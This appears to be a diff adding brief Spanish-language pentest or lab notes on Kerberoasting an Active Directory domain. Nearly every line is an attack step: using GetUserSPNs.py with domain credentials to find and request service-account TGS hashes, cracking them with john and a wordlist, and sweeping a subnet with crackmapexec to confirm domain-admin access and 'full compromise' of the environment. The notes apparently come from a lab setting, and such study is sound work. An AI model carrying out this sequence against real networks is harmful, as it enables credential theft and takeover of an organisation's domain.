@@ -1,0 +1,18 @@
+sudo nano /etc/hosts y añadir la IP y el dominio
+
+IP  genwin.local genwin DC-Company
+
+GetUserSPNs.py genwin.local/username:password 
+y vemos si hay algun usuario al que se le pueda hacer un ataque kerberos.
+Efectivamente hay un usuario vulnerable:
+ 
+GetUserSPNs.py genwin.local/username:password -request y obtenemos su hash TGS 
+Este hash se puede romper con john:
+john -w wordlist hash
+
+John no saca el usuario, pero se puede leer al principio del hash.
+
+
+y ahora validamos si con es administrador del dominio:
+crackmapexec smb 192.168.56.0/24 -u "username" -p "password"
+si pone Pwned! en todos, ya hemos comprometido el entorno por completo.
